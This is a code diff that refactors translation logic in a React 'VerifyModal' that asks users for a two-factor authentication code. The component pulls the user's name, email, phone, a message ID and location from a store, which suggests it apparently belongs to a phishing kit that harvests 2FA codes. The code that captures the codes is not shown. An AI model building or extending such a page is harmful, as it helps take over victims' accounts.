@@ -1,7 +1,7 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import { getTranslations } from '@/utils/translate';
+import { useTranslation } from '@/hooks/useTranslation';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
@@ -13,134 +13,19 @@ const VerifyModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
 
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
     const { messageId, message, setMessage, userFullName, userEmail, userPhone, setFormStep, geoInfo } = store();
     const maxCode = 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 30;
 
-    // Translation effect
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        (async () => {
-            const countryLangMap: Record<string, string> = {
-                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
-                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
-                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
-                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
-                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
-                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
-                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
-                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
-                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
-                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
-                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
-                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
-                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
-                VE: 'es',
-                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
-                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
-                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
-                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
-                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
-                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
-                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
-                YE: 'ar',
-                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
-                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
-                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
-                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
-                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
-                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
-                UA: 'uk', GB: 'en', VA: 'it',
-                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
-                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
-                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
-            };
-
-            const HARDCODED_LANGS = new Set([
-                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
-                'tr','th','ko','sv','id','ms','uk','bn','tl','no'
-            ]);
-
-            const cc = geoInfo.country_code.toUpperCase();
-            const lang = countryLangMap[cc] || 'en';
-            if (lang === 'en') return;
-
-            // Get hardcoded translations as base (if available)
-            const hardcoded = HARDCODED_LANGS.has(lang) ? (getTranslations(lang) || {}) : {};
-
-            const textsToTranslate = [
-                'Two-factor authentication required',
-                'Enter the code for this account that we send to',
-                ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
-                'Code',
-                'The two-factor authentication you entered is incorrect. Please, try again after',
-                'Continue',
-            ];
-
-            // Find texts missing from hardcoded translations
-            const missingTexts = textsToTranslate.filter(text => !hardcoded[text]);
-
-            // If all texts exist in hardcoded, use directly
-            if (missingTexts.length === 0) {
-                setTranslations(hardcoded);
-                return;
-            }
-
-            // Set hardcoded first for instant display, then fetch missing
-            if (Object.keys(hardcoded).length > 0) {
-                setTranslations(hardcoded);
-            }
-
-            const CACHE_KEY = 'translation_cache';
-            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
-            const cache = cached ? JSON.parse(cached) : {};
-
-            const allMissingCached = missingTexts.every(text => cache[`en:${lang}:${text}`]);
-            if (allMissingCached) {
-                const translatedMap: Record<string, string> = { ...hardcoded };
-                missingTexts.forEach(text => {
-                    translatedMap[text] = cache[`en:${lang}:${text}`];
-                });
-                setTranslations(translatedMap);
-                return;
-            }
-
-            const translatePromises = missingTexts.map(async (text) => {
-                const cacheKey = `en:${lang}:${text}`;
-                if (cache[cacheKey]) return { text, translated: cache[cacheKey] };
-                try {
-                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
-                        params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text }
-                    });
-                    const translatedText = response.data[0]
-                        ?.map((item: unknown[]) => item[0])
-                        .filter(Boolean)
-                        .join('') || text;
-                    cache[cacheKey] = translatedText;
-                    return { text, translated: translatedText };
-                } catch {
-                    return { text, translated: text };
-                }
-            });
-
-            const results = await Promise.all(translatePromises);
-            if (typeof window !== 'undefined') {
-                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
-            }
-
-            // Merge hardcoded + API results
-            const translatedMap: Record<string, string> = { ...hardcoded };
-            results.forEach(({ text, translated }) => {
-                translatedMap[text] = translated;
-            });
-            setTranslations(translatedMap);
-        })();
-    }, [geoInfo]);
-
-    const t = (text: string): string => translations[text] || text;
+    // Shared translation hook
+    const { t } = useTranslation([
+        'Two-factor authentication required',
+        'Enter the code for this account that we send to',
+        ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+        'Code',
+        'The two-factor authentication you entered is incorrect. Please, try again after',
+        'Continue',
+    ]);
 
     // Mask email - show first char and domain
     const maskEmail = (email: string): string => {
